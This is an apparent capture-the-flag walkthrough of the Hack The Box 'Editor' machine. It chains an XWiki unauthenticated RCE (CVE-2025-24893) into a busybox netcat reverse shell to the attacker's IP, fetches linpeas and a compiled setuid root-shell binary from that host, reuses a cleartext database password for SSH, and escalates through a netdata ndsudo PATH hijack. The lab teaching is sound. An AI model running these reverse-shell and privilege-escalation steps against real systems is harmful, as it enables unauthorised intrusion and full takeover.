# Editor - Easy

```sh
sudo vim /etc/hosts
# map target IP to editor.htb

nmap -T4 -p- -A -Pn -v editor.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
    * 80/tcp - http - nginx 1.18.0
    * 8080/tcp - http - Jetty 10.0.20

* the webpage on port 80 is for a code editor software, and the website is using React framework

* checking the links, we have a documentation page using the 'wiki.editor.htb' domain - we can add this in ```/etc/hosts```, and check for more subdomains:

    ```sh
    ffuf -c -u "http://editor.htb" -H "Host: FUZZ.editor.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 154 -s
    ```

* the 'wiki.editor.htb' domain is using XWiki, a open-source customizable Wiki page software, and is hosting the docs for the coding software

* from the footer we get the version XWiki Debian 15.10.8; also the doc pages give us an username 'neal'

* checking the webpage on port 8080, it leads to the same XWiki docs page as 'wiki.editor.htb'

* Googling for exploits associated with this XWiki version leads us to [CVE-2025-24893](https://www.offsec.com/blog/cve-2025-24893/) - an unauthenticated RCE vuln, and impacts XWiki 15.10.8

* we can run [the exploit](https://github.com/gunzf0x/CVE-2025-24893) and check if it works:

    ```sh
    # as per the exploit, we would not see response of code execution

    sudo tcpdump -i tun0 icmp
    # check on tun0 interface for ping

    # run exploit
    python3 Tools/CVE-2025-24893.py -t http://wiki.editor.htb -c 'ping -c 3 10.10.14.21'
    # we get ping response, that means it works

    nc -nvlp 4444

    python3 Tools/CVE-2025-24893.py -t http://wiki.editor.htb -c 'busybox nc 10.10.14.21 4444 -e sh'
    # tested with other reverse-shell one-liners, this works

    # we get reverse shell
    ```

* in reverse shell:

    ```sh
    which python3
    # installed

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z to bg shell
    stty raw -echo; fg
    # press Enter twice

    whoami
    # xwiki

    ls -la
    # currently in xwiki-jetty folder

    # enumerate other folders
    ls -la /

    ls -la /home
    # only one user 'oliver'

    ls -la /home/oliver/
    # permission denied

    # we can start with linpeas enum

    cd /tmp

    # fetch script
    wget http://10.10.14.21:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* highlights from ```linpeas```:

    * box running Linux version 5.15.0-151-generic, Ubuntu 22.04.5
    * multiple SUID binaries found under ```/opt/netdata```

* we did not get any cleartext passwords or any clues for 'oliver', so we need to check for config files in the filesystem:

    ```sh
    # checking config files in xwiki-jetty folder
    ls -la /usr/lib/xwiki-jetty

    ls -la /usr/lib/xwiki
    # enumerate linked and related folders

    # one of the subfolders contains a config file
    cat /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml
    # this contains a cleartext password
    ```

* from one of the linked config files for XWiki, we get a cleartext password 'theEd1t0rTeam99' for its DB connection

* checking for credential re-use, we are able to login as 'oliver':

    ```sh
    ssh oliver@editor.htb
    # this works

    cat user.txt
    # user flag

    sudo -l
    # does not work
    ```

* by running ```linpeas``` again for initial enumeration, we find a few ports listening internally:

    ```sh
    ss -ltnpu
    ```

* this shows port 19999 is listening on the host, and Googling shows that this is associated with ```netdata```, the app we checked earlier

* as we need to forward this port to our machine, we can do simple SSH forwarding (```ligolo``` can be used as an alternative):

    ```sh
    ssh -L 1234:localhost:19999 oliver@editor.htb
    # -L for local port forwarding
    # we can access netdata on our local port 1234 now
    ```

* navigating to 'http://localhost:1234', we get the netdata GUI, here we can see a dashboard

* there is also a warning indicating a node is below the recommended agent version v1.46.0

* to check the current node agent, navigate to Node > Info button - this shows netdata agent version 1.45.2

* Googling for exploits related to this leads to [CVE-2024-32019](https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation) - a privesc vuln associated with PATH hijacking in the ```ndsudo``` binary

* we can attempt this exploit:

    ```sh
    # on attacker
    vim rootshell.c
    # code to give root shell

    # compile exploit
    gcc rootshell.c -o nvme
    # required for ndsudo exploit
    ```

    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    int main() {
        setuid(0);
        setgid(0);
        execl("/bin/bash", "bash", NULL);
        return 0;
    }
    ```

    ```sh
    # on target
    # prepare the exploit env
    mkdir -p /tmp/fakebin

    cd /tmp/fakebin

    wget http://10.10.14.21:8000/nvme
    # fetch from attacker

    chmod +x nvme

    # modify PATH
    export PATH=/tmp/fakebin:$PATH

    which nvme
    # /tmp/fakebin/nvme

    ls -la /opt/netdata/usr/libexec/netdata/plugins.d/
    # check ndsudo exists

    # run exploit
    /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
    # this gives root shell

    cat /root/root.txt
    # root flag
    ```
